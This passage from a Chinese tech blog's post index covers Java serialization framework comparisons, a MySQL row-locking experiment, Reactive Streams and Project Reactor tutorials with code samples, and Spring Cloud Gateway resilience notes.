通用性\nAvro通过Schema定义数据结构，目前支持Java、C、C++、C#、Python、PHP和Ruby语言，所以在这些语言之间Avro具有很好的通用性。\n易用性\nAvro对于动态语言无需生成代码，但对于Java这类静态语言，还是需要使用avro-tools.jar来编译生成Java代码。在Schema编写上，个人感觉相比Thrift、Protobuf更加复杂。\n可扩展性\n 给所有field定义default值。如果某field没有default值，以后将不能删除该field。 如果要新增field，必须定义default值。 不能修改field type。 不能修改field name，不过可以通过增加alias解决。  性能\n使用Avro生成代码序列化之后的结果为：111。下面是使用Avro序列化的时间开销：\n    1000万序列化时间开销(ms) 1000万序反列化时间开销(ms)     生成Java代码 26565 45383    数据类型和语法结构支持\nAvro需要使用Avro所支持的数据类型来编写Schema信息，所以能够支持的Java数据类型即为Avro所支持的数据类型。Avro支持数据类型有：基础类型(null、boolean、int、long、float、double、bytes、string)，复杂数据类型(Record、Enum、Array、Map、Union、Fixed)。\nAvro自动生成代码，或者直接使用Schema，不能支持在序列化类中定义java方法。\n3. 总结 1 通用性 下面是从通用性上对比各个序列化框架，可以看出Protobuf在通用上是最佳的，能够支持多种主流变成语言。\n   序列化框架 通用性     JDK Serializer 只适用于Java   FST 只适用于Java   Kryo 主要适用于Java(可复杂支持跨语言)   Protocol buffer 支持多种语言   Thrift 支持多种语言   Hessian 支持多种语言   Avro 支持多种语言    2 易用性 下面是从API使用的易用性上面来对比各个序列化框架，可以说除了JDK Serializer外的序列化框架都提供了不错API使用方式。\n   序列化框架 易用性     JDK Serializer 使用语法过于生硬   FST 使用简洁，FSTConfiguration提供了序列化与反序列化的方法   Kryo 使用简洁，Input/Output封装了几乎所有能有需要的流方法   Protocol buffer 稍微复杂。需要编写所需序列化类的proto文件，然后编译生成Java代码。但是自动生成Java类，包含了序列化与反序列化方法   Thrift 稍微复杂。需要编写所需的序列化类的thrift文件，然后编译生成Java代码。然后通过TSerializer和TDserializer进行序列化与反序列化   Hessian 使用简单，在跨语言的基础上不需要使用IDL   Avro 使用较复杂。相较于Protobuf和Thrift来说，对于一些静态语言无序生成代码。但是对于Java来一般还需要生成代码，并且Avro提供的API不是很友好    3 可扩展性 下面是各个序列化框架的可扩展性对比，可以看到Protobuf的可扩展性是最方便、自然的。其它序列化框架都需要一些配置、注解等操作。\n   序列化框架 可扩展性     JDK Serializer 自定义serialVersionUID，保证序列化前后VUID一致即可   FST 通过@Version控制版本，新增字段需要修改Version版本   Kryo 默认序列化器不支持字段扩展，需要修改默认序列化器或自己实现序列化器   Protocol buffer 支持字段扩展，只要保证新增id标识没有使用过即可   Thrift 支持字段扩展。新增字段为required类型时，需要设置默认值   Hessian 支持字段扩展   Avro 支持字段扩展。注意需要为字段设置默认值    4 性能 序列化大小对比\n对比各个序列化框架序列化后的数据大小如下，可以看出kryo preregister(预先注册序列化类)和Avro序列化结果都很不错。所以，如果在序列化大小上有需求，可以选择Kryo或Avro。\n序列化时间开销对比\n下面是序列化与反序列化的时间开销，kryo preregister和fst preregister都能提供优异的性能，其中fst pre序列化时间就最佳，而kryo pre在序列化和反序列化时间开销上基本一致。所以，如果序列化时间是主要的考虑指标，可以选择Kryo或FST，都能提供不错的性能体验。\n5 数据类型和语法结构支持 各序列化框架对Java数据类型支持的对比：\n注：集合类型测试基本覆盖了所有对应的实现类。\n List测试内容：ArrayList、LinkedList、Stack、CopyOnWriteArrayList、Vector。 Set测试内容：HashSet、LinkedHashSet、TreeSet、CopyOnWriteArraySet。 Map测试内容：HashMap、LinkedHashMap、TreeMap、WeakHashMap、ConcurrentHashMap、Hashtable。 Queue测试内容：PriorityQueue、ArrayBlockingQueue、LinkedBlockingQueue、ConcurrentLinkedQueue、SynchronousQueue、ArrayDeque、LinkedBlockingDeque和ConcurrentLinkedDeque。  下面根据测试总结了以上序列化框架所能支持的数据类型、语法。\n 注1：static内部类需要实现序列化接口。 注2：外部类需要实现序列化接口。 注3：需要在Lambda表达式前添加(IXxx \u0026amp; Serializable)。   由于Protobuf、Thrift是IDL定义类文件，然后使用各自的编译器生成Java代码。IDL没有提供定义staic内部类、非static内部类等语法，所以这些功能无法测试。\n 参考 几种Java常用序列化框架的选型与对比 Java对象为啥要实现Serializable接口？ ","date":"2021-09-26","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E5%87%A0%E7%A7%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/","series":["Manual"],"tags":["Java","SA"],"title":"几种序列化框架对比"},{"categories":["编程思想"],"content":"实验前提：MySQL默认隔离级别 = REPEATABLE-READ\nSession1\n初始化商品数量=1\nmysql\u0026gt; select @@tx_isolation; +-----------------+ | @@tx_isolation | +-----------------+ | REPEATABLE-READ | +-----------------+ 1 row in set (0.02 sec) mysql\u0026gt; select connection_id(); +-----------------+ | connection_id() | +-----------------+ | 6667466 | +-----------------+ 1 row in set (0.01 sec) mysql\u0026gt; update test.good set good_num = 1 where good_name = \u0026#39;iphone13\u0026#39;; Query OK, 1 row affected (0.01 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql\u0026gt; select * from test.good; +----+-----------+----------+---------------------+---------------------+ | id | good_name | good_num | updated_at | created_at | +----+-----------+----------+---------------------+---------------------+ | 1 | iphone13 | 1 | 2021-09-22 14:06:47 | 2021-09-22 10:30:20 | +----+-----------+----------+---------------------+---------------------+ 1 row in set (0.11 sec) mysql\u0026gt; SELECT TRX_ID FROM INFORMATION_SCHEMA.INNODB_TRX WHERE TRX_MYSQL_THREAD_ID = CONNECTION_ID(); Empty set Session2\n 关闭自动提交 set autocommit=0; 更新商品数量  mysql\u0026gt; select @@tx_isolation; +-----------------+ | @@tx_isolation | +-----------------+ | REPEATABLE-READ | +-----------------+ 1 row in set (0.02 sec) mysql\u0026gt; select connection_id(); +-----------------+ | connection_id() | +-----------------+ | 6667088 | +-----------------+ 1 row in set (0.02 sec) mysql\u0026gt; select * from test.good; +----+-----------+----------+---------------------+---------------------+ | id | good_name | good_num | updated_at | created_at | +----+-----------+----------+---------------------+---------------------+ | 1 | iphone13 | 1 | 2021-09-22 14:06:47 | 2021-09-22 10:30:20 | +----+-----------+----------+---------------------+---------------------+ 1 row in set (0.01 sec) mysql\u0026gt; SELECT TRX_ID FROM INFORMATION_SCHEMA.INNODB_TRX WHERE TRX_MYSQL_THREAD_ID = CONNECTION_ID(); +-----------------+ | TRX_ID | +-----------------+ | 421350996972592 | +-----------------+ 1 row in set (0.02 sec) mysql\u0026gt; update test.good set good_num = good_num-1 where good_name = \u0026#39;iphone13\u0026#39;; Query OK, 1 row affected (0.01 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql\u0026gt; select * from test.good; +----+-----------+----------+---------------------+---------------------+ | id | good_name | good_num | updated_at | created_at | +----+-----------+----------+---------------------+---------------------+ | 1 | iphone13 | 0 | 2021-09-22 14:07:55 | 2021-09-22 10:30:20 | +----+-----------+----------+---------------------+---------------------+ 1 row in set (0.02 sec) Session3\n 关闭自动提交 set autocommit=0; 更新商品数量  mysql\u0026gt; select @@tx_isolation; +-----------------+ | @@tx_isolation | +-----------------+ | REPEATABLE-READ | +-----------------+ 1 row in set (0.01 sec) mysql\u0026gt; select connection_id(); +-----------------+ | connection_id() | +-----------------+ | 6667089 | +-----------------+ 1 row in set (0.02 sec) mysql\u0026gt; select * from test.good; +----+-----------+----------+---------------------+---------------------+ | id | good_name | good_num | updated_at | created_at | +----+-----------+----------+---------------------+---------------------+ | 1 | iphone13 | 1 | 2021-09-22 14:06:47 | 2021-09-22 10:30:20 | +----+-----------+----------+---------------------+---------------------+ 1 row in set (0.01 sec) mysql\u0026gt; SELECT TRX_ID FROM INFORMATION_SCHEMA.INNODB_TRX WHERE TRX_MYSQL_THREAD_ID = CONNECTION_ID(); +-----------------+ | TRX_ID | +-----------------+ | 421350996977312 | +-----------------+ 1 row in set (0.02 sec) #会一直阻塞到Session2执行完commit mysql\u0026gt; update test.good set good_num = good_num-1 where good_name = \u0026#39;iphone13\u0026#39;; 执行update的时候会被阻塞，因为Session2事务在update数据的瞬间对数据加了行级排他锁，直到Session2事务结束才释放。\nSession2\n提交 commit\nmysql\u0026gt; commit; Query OK, 0 rows affected (0.01 sec) Session3\n被Session2中事务阻塞的update语句被执行了\n#会一直阻塞到Session2执行完commit mysql\u0026gt; update test.good set good_num = good_num-1 where good_name = \u0026#39;iphone13\u0026#39;; Query OK, 1 row affected (8.22 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql\u0026gt; select * from test.good; +----+-----------+----------+---------------------+---------------------+ | id | good_name | good_num | updated_at | created_at | +----+-----------+----------+---------------------+---------------------+ | 1 | iphone13 | -1 | 2021-09-22 14:08:42 | 2021-09-22 10:30:20 | +----+-----------+----------+---------------------+---------------------+ 1 row in set (0.02 sec) Session1\n查看商品数量\nmysql\u0026gt; select * from test.good; +----+-----------+----------+---------------------+---------------------+ | id | good_name | good_num | updated_at | created_at | +----+-----------+----------+---------------------+---------------------+ | 1 | iphone13 | 0 | 2021-09-22 14:07:55 | 2021-09-22 10:30:20 | +----+-----------+----------+---------------------+---------------------+ 1 row in set (0.02 sec) Session3\n提交 commit\nmysql\u0026gt; commit; Query OK, 0 rows affected (0.01 sec) Session1\n查看商品数量\nmysql\u0026gt; select * from test.good; +----+-----------+----------+---------------------+---------------------+ | id | good_name | good_num | updated_at | created_at | +----+-----------+----------+---------------------+---------------------+ | 1 | iphone13 | -1 | 2021-09-22 14:08:42 | 2021-09-22 10:30:20 | +----+-----------+----------+---------------------+---------------------+ 1 row in set (0.01 sec) ","date":"2021-09-22","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/mysql%E5%AE%9E%E9%AA%8C/","series":["Manual"],"tags":["MySQL"],"title":"MySQL实验"},{"categories":["编程思想"],"content":"JDK的异步处理，一直相对较弱，这方面也有很强的第三方框架。最近在学习这方面的内容，将学习过程记录在这里。\n这篇文章里，主要了解Java中异步流处理的顶级概念：Reactive Streams。\n1. 起源 Reactive Streams，翻译为反应式流，从名字上完全无法理解它的意义，像是两个硬凑在一起的词汇。\n事实上，它并不是一个全新的事物，异步编程大家都有了解，Java里典型的多线程处理就是异步编程。而异步编程时，存在很多难题，比如典型的回调地狱(Callback Hell)，一层套一层的回调函数简直是个灾难，这里列出几个异步编程常见的问题：\n 超时、异常处理困难 难以重构 多个异步任务协同处理  为了解决异步编程过程中出现的种种难题，人们提出了各种各样方法来规避这些问题，这些方法称为反应式编程(Reactive Programming)，就像面向对象编程，函数式编程一样，反应式编程也是另一种编程范式。\n反应式编程，本质上是对数据流或某种变化所作出的反应，但是这个变化什么时候发生是未知的，所以他是一种基于异步、回调的方式在处理问题。\n Reactive Programming = Streams + Operations Streams代表被处理的数据节点，Operations代表那些异步处理\n 当越来越多的开发人员使用这种编程思想时，自然而然需要一套统一的规范。由此，2013年底Netflix，Pivotal和Lightbend中的工程师们，启动了Reactive Streams 项目，希望为异步流(包含背压)处理提供标准，它包括针对运行时环境（JVM和JavaScript）以及网络协议的工作。\n2. 概念 对于Java程序员，Reactive Streams是一个API。Reactive Streams为我们提供了Java中的Reactive Programming的通用API。\nReactive Streams非常类似于JPA或JDBC。两者都是API规范，实际使用时需要使用API对应的具体实现。例如，从JDBC规范中，有DataSource接口，而Oracle JDBC实现了DataSource接口。Microsoft的SQL Server JDBC实现也实现了DataSource接口。\n就像JPA或JDBC一样，Reactive Streams为我们提供了一个我们可以编写代码的API接口，而无需担心底层实现，在GitHub上可以查看API的源码 。\nReactive Streams API的范围是找到一组最小的接口，方法和协议，这些接口，方法和协议将描述必要的操作和实体，从而实现具有非阻塞背压的异步数据流。\n从代码结构上看，它主要包含两部分：reactive-streams和reactive-streams-tck。其中TCK意为技术兼容包（Technology Compatibility Kit ），为实现Reactive Streams接口提供帮助。\nReactive Streams API中仅仅包含了如下四个接口：\n//发布者 public interface Publisher \u0026lt; T \u0026gt; { public void subscribe（Subscriber \u0026lt;？ super T \u0026gt; s）; } //订阅者 public interface Subscriber \u0026lt; T \u0026gt; { public void onSubscribe（Subscription s）; public void onNext（T t）; public void onError（Throwable t）; public void onComplete（）; } //表示Subscriber消费Publisher发布的一个消息的生命周期 public interface Subscription { public void request(long n); public void cancel(); } //处理器，表示一个处理阶段，它既是订阅者也是发布者，并且遵守两者的契约 public interface Processor\u0026lt;T, R\u0026gt; extends Subscriber\u0026lt;T\u0026gt;, Publisher\u0026lt;R\u0026gt; { } 3. 目标 Reactive Streams的主要目标有这两个：\n 管理跨异步边界的流数据交换 - 即将元素传递到另一个线程或线程池； 确保接收方不会强制缓冲任意数量的数据，为了使线程之间的队列有界，引入了回压(Back Pressure)。  传统异步编程的写法，不同任务分别在不同的线程中执行，协调这些线程执行的先后顺序、线程间的依赖顺序是一件非常麻烦的事情，而Reactive Streams就是为了解决该问题。\n另外，Reactive Streams规范引入了回压(Back Pressure)，可以动态控制线程间消息交换的速率，避免生产者产生过多的消息，消费者消费不完等类似问题。\n4. 一些思考 Reactive Streams，是一套非阻塞背压的异步数据流的API。这个概念看起来有点拗口，这里拆开分析下：\n4.1 Reactive  这是个形容词，翻译为反应的，这个词乍一看相当奇怪，这里尝试做一下解释。\n 事实上，在某些语境下，reactive也会被翻译为被动，而Reactive Streams是基于消息驱动的（也可以说是事件驱动的），当消息产生时，系统被动接受消息，并作出反馈，而非主动处理。因此，我们也可以这样理解：被动地接收消息后，作出相应的反应动作，这个行为称之为反应式。\n4.2 Streams  这是个名词，翻译为数据流，反应式编程的核心思想，体现在了这个单词上。\n 流的定义：随着时间顺序排列的一组序列。一切皆是流(Everything is a stream)。我们可以把一组数据抽象为流(可以想象流是一个数组)，把对流中节点的逻辑处理，抽象成对节点的一步一步的处理，围绕该节点做加工处理，最终获得结果。\n这跟工厂车间的流水线非常相似，发布者将半成品放到传送带上，经过层层处理后，得到成品送到订阅者手中。\n而异步特性，是体现在每一步的处理过程中的，每一步处理都是消息驱动的，不阻塞应用程序，被动获得结果后继续进行下一步。\n 响应式编程，在处理流中节点时，各个步骤都使用异步的、消息驱动的方式处理任务，才会节省性能。\n  传统的命令式编程范式以控制流为核心，通过顺序、分支和循环三种控制结构来完成不同的行为。 在反应式编程中，应用程序从以逻辑为中心转换为了以数据为中心，这也是命令式到声明式的转换。\n 4.3 非阻塞、异步 反义词是阻塞、同步，目前在Java中，大多数应用程序是同步的，即暴力创建线程，线程阻塞时，一直等待直到有结果返回。\n异步最吸引人的地方在于资源的充分利用，不把资源浪费在等待的时间上，代价是增加了程序的复杂度，而Reactive Streams封装了这些复杂性，使其变得简单。\n4.4 背压(back-pressure) 背压是从流体动力学中借用的类比, 在维基百科的定义是：抵抗所需流体通过管道的阻力或力。在软件环境中，可以调整定义：通过软件抵抗所需数据流的阻力或力量。\n背压是为了解决这个问题的： 上游组件了过量的消息，导致下游组件无法及时处理，从而导致程序崩溃。\nback-pressure\n对于正遭受压力的组件来说，无论是灾难性地失败，还是不受控地丢弃消息，都是不可接受的。既然它既不能应对压力，又不能直接做失败处理，那么它就应该向其上游组件传达其正在遭受压力的事实，并让它们降低负载。\n这种背压（back-pressure）是一种重要的反馈机制，使得系统得以优雅地响应负载，而不是在负载下崩溃。相反，如果下游组件比较空闲，则可以向上游组件发出信号，请求获得更多的调用。\n5. 与Java1.8、Java1.9的关系 Reactive Streams不要求必须使用Java8，Reactive Streams也不是Java API的一部分。\n但是使用Java8中lambda表达式的存在，可以发挥Reactive Streams规范的强大特性，比如Reactive Streams的实现Project Reactor项目的当前版本，就要求最低使用Java1.8。\n Java8中的Stream和Reactive Streams\n它们都使用了流式处理的思想，围绕数据流处理数据，即完成了从命令式到声明式的转换，使数据处理更方便。 不同的地方在于，Java8中的Stream是同步的、阻塞的，Reactive Streams是异步的、非阻塞的。\n 当使用Java1.9时， Reactive Streams已成为官方Java 9 API的一部分 ，Java9中Flow类下的内容与Reactive Streams完全一致。\n6. 具体实现框架 Reactive Streams的实现现在比较多了，David Karnok在Advanced Reactive Java 这边文章中，将这些实现分解成几代，也可以侧面了解反应式编程的发展史。\nRxJava\nRxJava是ReactiveX项目中的Java实现。ReactiveX项目实现了很多语言，比如JavaScript，.NET（C＃），Scala，Clojure，C ++，Ruby，Python，PHP，Swift等。\nRxJava早于Reactive Streams规范。虽然RxJava 2.0+确实实现了Reactive Streams API规范，单使用的术语略有不同。\nReactor\nReactor是Pivotal提供的Java实现，它作为Spring Framework 5的重要组成部分，是WebFlux采用的默认反应式框架。\nAkka Streams\nAkka Streams完全实现了Reactive Streams规范，但Akka Streams API与Reactive Streams API完全分离。\nRatpack\nRatpack是一组用于构建现代高性能HTTP应用程序的Java库。Ratpack使用Java 8，Netty和Reactive原则。可以将RxJava或Reactor与Ratpack一起使用。\nVert.x\nVert.x是一个Eclipse Foundation项目，它是JVM的多语言事件驱动的应用程序框架。Vert.x中的反应支持与Ratpack类似。Vert.x允许我们使用RxJava或其Reactive Streams API的实现。\n7. 小结 在Reactive Streams之前，各种反应库无法实现互操作性。早期版本的RxJava与Project Reactor的早期版本不兼容。\n另外，反应式编程无法大规模普及，一个很重要的原因是并不是所有库都支持反应式编程，当一些类库只能同步调用时，就无法达到节约性能的作用了。\nReactive Streams的推出统一了反应式编程的规范，并且已经被Java9集成。由此，不同的库可以互操作了，互操作性是一个重要的多米诺骨牌。\n例如，MongoDB实现了Reactive Streams驱动程序 后，我们可以使用Reactor或RxJava来使用MongoDB中的数据。\n参考 Reactive Streams 介绍 ","date":"2021-09-16","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/reactive-streams/","series":["Manual"],"tags":["Java"],"title":"Reactive Streams"},{"categories":["编程思想"],"content":"上一篇文章中，我们介绍了Reactive Streams规范，现在学习一个Reactive Streams规范的流行实现：Project Reactor的核心项目Reactor Core。\n1. Project Reactor 简介 Project Reactor 是一个运行在JVM上的反应式编程基础库，以“背压”的形式管理数据处理，提供了可组合的异步序列APIFlux和Mono。同时，它也实现了Reactive Streams 规范。关于反应式编程以及Reactive Streams的相关内容，上篇文章已做过介绍，这里不再赘述。\n 所谓Spring Reactor\nProject Reactor 主要是由Pivotal公司 开发和维护的，Spring框架也是该公司在维护，而且Spring Framework 5中默认使用Reactor作为反应式编程的实现，由此虽然Reactor不是Spring的子项目，也有人称Reactor为Spring Reactor。\n 众所周知，I/O阻塞浪费了系统性能，只有纯异步处理才能发挥系统的全部性能，不作丝毫浪费；而JDK的异步API比较难用，成为异步编程的瓶颈，这就是Reactor等其它反应式框架诞生的原因。\nReactor大大降低了异步编码难度(尽管相比同步编码，复杂度仍然是上升的)，变得简单的根本原因，是编码思想的转变。\nJDK的异步API使用的是传统的命令式编程，命令式编程是以控制流为核心，通过顺序、分支和循环三种控制结构来完成不同的行为。而Reactor使用反应式编程，应用程序从以逻辑为中心转换为了以数据为中心，这也是命令式到声明式的转换。\n1.1 从命令式到反应式编程 Reactor反应库旨在解决JVM上“经典”异步方法的缺点，同时还拥有如下特点：\n 可组合性和可读性，完美规避了Callback Hell 以流的形式进行数据处理时，为流中每个节点提供了丰富的操作符 在Subscribe之前，不会有任何事情发生 支持背压，消费者可以向生产者发出信号表明排放率过高 支持两种反应序列：hot和cold  1.2 子项目列表 Project Reactor 试图提供反应式编程相关的各类基础库，它包含了如下子项目：\n   模块名称 最新正式版本 描述     Reactor Core 3.2.11.RELEASE 一个实现了Reactive Streams规范的基础库   Reactor Test 3.2.11.RELEASE 测试套件   Reactor Extra / Reactor Addons 3.2.3.RELEASE 扩展库，包含reactor-adapter和reactor-extra，增强了Reactor Core的功能   Reactor Netty 0.8.10.RELEASE 基于Netty，提供了非阻塞的、支持背压的TCP/HTTP/UDP客户端和服务端   Reactor Adapter 3.2.3.RELEASE 支持桥接到其它反应式库，如RxJava   Reactor Kafka 1.1.1.RELEASE 桥接到Apache Kafka   Reactor Kotlin Extensions 没有发布正式版 为Kotlin语言添加各种扩展和适配器   Reactor RabbitMQ 1.2.0.RELEASE 桥接到RabbitMQ   BlockHound 没有发布正式版 用于检测来自非阻塞线程的阻塞调用   Reactor Core .NET 0.6.1 为.NET孵化反应流基础库   Reactor Core JS 0.5.0 为Javascript孵化反应流基础库    除了上述最后三个子项目，其它子项目都是构建于Reactor Core之上，这也是下面要介绍的主要内容。\n Reactor Core直接集成了Java 8相关的API，例如CompletableFuture、Stream、Duration，所以Java 8是使用Reactor的最低版本。\n  Reactive Streams规范诞生于Reactor之后，Reactor是在2.0.0.RC1版本时，支持了Reactive Streams规范，点击查看版本BLOG 。\n 2 Flux \u0026 Mono Flux\u0026lt;T\u0026gt;是一个标准的Reactive Streams规范中的Publisher\u0026lt;T\u0026gt;，它代表一个包含了[0…N]个元素的异步序列流。在Reactive Streams规范中，针对流中每个元素，订阅者将会监听这三个事件：onNext、onComplete、onError。\nMono\u0026lt;T\u0026gt;是一个特殊的Flux\u0026lt;T\u0026gt;，它代表一个仅包含1个元素的异步序列流。因为只有一个元素，所以订阅者只需要监听onComplete、onError。\n2.1 创建并订阅Flux或Mono 创建Flux或Mono的最简单方法，是使用那些工厂方法，如just、fromIterable、empty、range。当需要订阅它们时，可以调用如下几个重载的方法。\nsubscribe();//仅订阅并触发流，不做其它处理  subscribe(Consumer\u0026lt;? super T\u0026gt; consumer);//处理流中的每个元素  subscribe(Consumer\u0026lt;? super T\u0026gt; consumer, Consumer\u0026lt;? super Throwable\u0026gt; errorConsumer);//处理流中的元素、处理相应的异常  subscribe(Consumer\u0026lt;? super T\u0026gt; consumer, Consumer\u0026lt;? super Throwable\u0026gt; errorConsumer, Runnable completeConsumer);//处理流中的元素、处理相应的异常；当流结束时，可以执行一些内容  subscribe(Consumer\u0026lt;? super T\u0026gt; consumer, Consumer\u0026lt;? super Throwable\u0026gt; errorConsumer, Runnable completeConsumer, Consumer\u0026lt;? super Subscription\u0026gt; subscriptionConsumer);//最后一个参数Subscription，代表处理一个元素的生命周期，也是Reactive Streams规范中定义的 2.2 编程的方式创建Flux generate、create、push、handle方法支持以编程的方式创建Flux，使创建方式更加灵活。\ngenerate方法创建的流是同步的，流内元素是有序的，依次被订阅者消费。\ncreate方法以异步、多线程的方式创建流。\npush方法以异步、单线程的方式创建流。\nhandle方法是一个示例方法，它类似于generate，将一个已经存在的流，转换成同步的流。\n以下是generate方法的一个简单示例：\nFlux\u0026lt;String\u0026gt; flux = Flux.generate( () -\u0026gt; 0, (state, sink) -\u0026gt; { sink.next(\u0026#34;3 x \u0026#34; + state + \u0026#34; = \u0026#34; + 3 * state); if (state == 5) sink.complete(); return state + 1; }); /** 流中的元素依次是： 3 x 0 = 0 3 x 1 = 3 3 x 2 = 6 3 x 3 = 9 3 x 4 = 12 3 x 5 = 15 **/ 3. 使用示例 使用静态工厂方法fromIterable创建一个Flux对象，而flatMap、filter等非静态方法即所谓操作符，多种操作符组合使用，可以对数据流的元素进行复杂处理。\nList\u0026lt;String\u0026gt; words = Arrays.asList(\u0026#34;th\u0026#34;, \u0026#34;qu\u0026#34;); Flux\u0026lt;String\u0026gt; manyLetters = Flux .fromIterable(words) .flatMap(word -\u0026gt; { System.out.println(\u0026#34;Step1=\u0026#34; + word); return Flux.fromArray(word.split(\u0026#34;\u0026#34;));}) .filter(s -\u0026gt; { System.out.println(\u0026#34;Step2=\u0026#34; + s); return true; }).filter(s -\u0026gt; { System.out.println(\u0026#34;Step3=\u0026#34; + s); return true; }); manyLetters.subscribe(s -\u0026gt; System.out.println(\u0026#34;Result=\u0026#34; + s + \u0026#34;\\n\u0026#34;)); /** 输出结果： Step1=th Step2=t Step3=t Result=t Step2=h Step3=h Result=h Step1=qu Step2=q Step3=q Result=q Step2=u Step3=u Result=u **/ 观察manyLetters变量的结构，Flux之所以支持对流中数据的链式调用，是因为每一步返回的Flux对象都被上一个Flux对象包含。\n 组合的操作符(Operator)对流中数据进行处理，实际上是对Publisher发布消息前的功能增强，使元素可以在发布之前被加工处理好。\n 如果仅看上面这种使用方式，看起来与Java 8的Stream差不多，并没有体现异步的特性，数据流在一开始就是确定的。假如不存在异步处理，使用Reactor就没有什么意义了。\n与Java 8的Stream不同，Reactor支持以异步的方式创建Flux，看如下代码片段，MongoDB与Reactor结合使用：\nprivate MongoCollection\u0026lt;Document\u0026gt; collection; public Flux\u0026lt;Restaurant\u0026gt; findAll() { return Flux.from(collection.find()) .map(RestaurantTransfer::toDomainObject) .filter(Optional::isPresent) .map(Optional::get); } public static void main(String[] args) { ReactiveRestaurantRepository repository = new ReactiveRestaurantRepository(); Flux\u0026lt;Restaurant\u0026gt; flux = repository.findAll(); flux.subscribe(System.out::println); } public static \u0026lt;T\u0026gt; Flux\u0026lt;T\u0026gt; from(Publisher\u0026lt;? extends T\u0026gt; source)方法接收一个org.reactivestreams.Publisher参数，该对象是由MongoDB的Reactive客户端API创建的，MongoDB通过该对象，将DB中的数据，链接到Reactor的流中。\n当调用subscribe方法后，一个发布-订阅的机制形成，只有当对象被从DB中取出并放入内存后，JVM才会占用线程资源，将消息发送给订阅者；从阻塞等待转变为了被动接收，因此节省了资源。\n 由此可见，只有流中的数据全部是反应式的，Reactor才能发挥最大作用，一旦有节点被阻塞，就达不到节省资源的目的了。\n  正是由于MongoDB和Reactor Core都实现了Reactive Streams规范，它们才能相互沟通交互，Reactive Streams规范在反应式编程的推广过程中，起着至关重要的作用。\n当反应式编程的生态越来越完整，将会有更多的人考虑使用这种编程方式。\n 4. 与Spring的关系 Reactor是Spring整个生态系统的基础，特别是Spring Framework 5和 Spring Data “kay”。\n这两个项目的Reactive版本是非常有意义的，我们可以基于此开发出完全Reactive的Web应用：支持对请求的全链路异步处理，一直到数据库，最后异步地返回结果。\nSpring项目因此可以更有效地利用资源，避免为每个请求单独分配一个线程，产生I/O阻塞。\n5. 小结 本文对Project Reactor做了一个基本介绍，旨在使读者明白Project Reactor的意义和价值。\n作为一名普通的程序员(专注业务开发)，我们接触最多的可能是WebFlux框架，以及Flux、Mono这些基础对象，在理解Project Reactor基本思想的基础上，再使用上层框架，将会更加得心应手。\n6.实验 了解Reactor基本原理之后，我们再看两个实验：\n异步流：\npublic static void main(String[] args) throws InterruptedException { //间隔2秒递增发出long型元素，首个long元素延迟5秒后发出  Flux\u0026lt;Long\u0026gt; flux = Flux.interval(Duration.ofSeconds(5), Duration.ofSeconds(2)); flux.subscribe(data -\u0026gt; System.out.println(\u0026#34;流数据: \u0026#34;+ data)); //flux.toStream().forEach(data -\u0026gt; System.out.println(\u0026#34;流数据: \u0026#34; + data));  while (true) { Thread.sleep(2000); System.out.println(\u0026#34;******\u0026#34;); } } /** * 输出结果 👇👇 * * ****** * ****** * 流数据: 0 * ****** * 流数据: 1 * ****** * 流数据: 2 * ****** * 流数据: 3 * ****** * 流数据: 4 * ****** * 流数据: 5 * ****** * 流数据: 6 */ 异步流转成Java8同步流：\npublic static void main(String[] args) throws InterruptedException { //间隔2秒递增发出long型元素，首个long元素延迟5秒后发出  Flux\u0026lt;Long\u0026gt; flux = Flux.interval(Duration.ofSeconds(5), Duration.ofSeconds(2)); //flux.subscribe(data -\u0026gt; System.out.println(\u0026#34;流数据: \u0026#34;+ data));  flux.toStream().forEach(data -\u0026gt; System.out.println(\u0026#34;流数据: \u0026#34; + data)); while (true) { Thread.sleep(2000); System.out.println(\u0026#34;******\u0026#34;); } } /** * 输出结果 👇👇 * * 流数据: 0 * 流数据: 1 * 流数据: 2 * 流数据: 3 * 流数据: 4 */ 参考 Project Reactor介绍 响应式编程笔记二：写点代码 ","date":"2021-09-16","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/project-reactor/","series":["Manual"],"tags":["Java"],"title":"Project Reactor"},{"categories":["架构演进"],"content":"Spring cloud gateway 👉 webflux 👉 project reactor 👉 netty 👉 epoll\n上述流程图指出Spring cloud gateway关键技术依赖。\nwebflux基于 spring 5.x 和 reactor-netty 构建，不依赖于 Servlet 容器，但是可以在支持 Servlet 3.1 Non-Blocking IO API 的容器上运行。\n  Spring WebFlux是基于响应式流的，因此可以用来建立异步的、非阻塞的、事件驱动的服务。它采用Reactor作为首选的响应式流的实现库，不过也提供了对RxJava的支持。\n  由于响应式编程的特性，Spring WebFlux和Reactor底层需要支持异步的运行环境，比如Netty和Undertow；也可以运行在支持异步I/O的Servlet 3.1的容器之上，比如Tomcat（8.0.23及以上）和Jetty（9.0.4及以上）。\n  从图的纵向上看，spring-webflux上层支持两种开发模式：\n  类似于Spring WebMVC的基于注解（@Controller、@RequestMapping）的开发模式；\n  Java 8 lambda 风格的函数式开发模式。\n    Spring WebFlux也支持响应式的Websocket服务端开发。\n  限流 自带RequestRateLimiter\nsentinel提供了适配器：sentinel-spring-cloud-gateway-adapter\n熔断降级 引入 spring-cloud-starter-netflix-hystrix 即可\n熔断：当HystrixCommand请求后端服务失败数量超过一定比例(默认50%), 断路器会切换到开路状态(Open). 这时所有请求会直接失败而不会发送到后端服务，断路器保持在开路状态一段时间后(默认5秒)，自动切换到半开路状态(HALF-OPEN)，这时会判断下一次请求的返回情况， 如果请求成功, 断路器切回闭路状态(CLOSED)，否则重新切换到开路状态(OPEN)\n降级：服务降级是指当请求后端服务出现异常的时候, 可以使用fallback方法返回的值\n4种错误情况将触发fallback：\n 非HystrixBadRequestException异常 run()/construct()运行超时 熔断器启动 线程池/信号量已满  缓存 hystrix\n业务隔离 通过hystrix做隔离\n隔离：将请求封装在HystrixCommand中，然后这些请求在一个独立的线程中执行，每个依赖服务维护一个小的线程池（或信号量），在调用失败或超时的情况下可以断开依赖调用或者返回指定逻辑\n 不同服务通过使用不同线程池，彼此间将不受影响，达到隔离效果。 隔离本地代码或可快速返回远程调用(如memcached,redis)可以直接使用信号量隔离,降低线程隔离开销.  总结：command 